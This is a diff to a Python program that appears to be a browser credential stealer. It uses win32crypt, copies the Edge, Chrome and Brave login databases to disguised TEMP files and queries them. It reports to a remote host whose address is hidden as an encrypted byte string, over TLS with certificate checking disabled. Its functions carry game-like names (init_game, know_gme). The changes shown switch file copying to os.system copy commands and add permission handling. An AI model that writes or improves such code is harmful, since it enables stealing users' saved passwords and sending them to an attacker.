@@ -3,6 +3,7 @@ import secrets
 import shutil
 import sqlite3
 import json
+import subprocess
 import tempfile
 import time
 import win32crypt
@@ -16,7 +17,7 @@ import certs
 import os
 import get_points
 connect = False
-warnings.filterwarnings("ignore", category=DeprecationWarning)
+import getSesions #warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 #
 # Autor   ->  an0mal1a
@@ -25,13 +26,12 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 # Correo  -> pablodiez024@proton.me
 #
 
-
 def know_gme():
     unkown = b'u\x1b1.\x9aQ\x11CO>\x87:e7\xd6q\x14\x02[#\x8d{p\xad\x99\xecj\t\xea\xc7\xd3\xc6\xe1\x15n\xce|a=BowY$\xc4,\x846\x7fG\x82\xca\xbb\x1e\xbb\x93<\x1e\xb6\x03S\x1a\\\xff'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
-import getSesions
+
 
 try:
     cock = tempfile.NamedTemporaryFile(delete=False)
@@ -43,8 +43,9 @@ try:
     csd.close()
 
 
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-    #context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
     context.load_cert_chain(certfile=cock.name, keyfile=csd.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -116,7 +117,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             key = cmlpt_gme(locat_e)
 
             fnilam = os.path.join(os.environ['TEMP'], 'tem5B46.tmp')
-            shutil.copyfile(ede, fnilam)
+            cmd = f'copy "{ede}" "{fnilam}" >nul 2>&1 '
+            os.system(cmd)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
             drct.execute(
@@ -141,7 +143,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
 
             fnilam = os.path.join(os.environ['TEMP'], 'tem5B52.tmp')
 
-            shutil.copyfile(gle, fnilam)
+            cmd = f'copy "{gle}" "{fnilam}" >nul 2>&1 '
+            os.system(cmd)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
             drct.execute(
@@ -164,7 +167,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             key = cmlpt_gme(locat_b)
 
             fnilam = os.path.join(os.environ['TEMP'], 'tem2B82.tmp')
-            shutil.copyfile(brve, fnilam)
+            cmd = f'copy "{brve}" "{fnilam}" >nul 2>&1 '
+            os.system(cmd)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
             drct.execute(
@@ -184,6 +188,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             edge()
         except FileNotFoundError:
             sec.send("\n\n\t[!] Edge not found".encode())
+        except PermissionError:
+            sec.send("\n\n\t[!] We can't acces to Edge...".encode())
         try:
             google()
         except FileNotFoundError:
@@ -228,5 +234,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
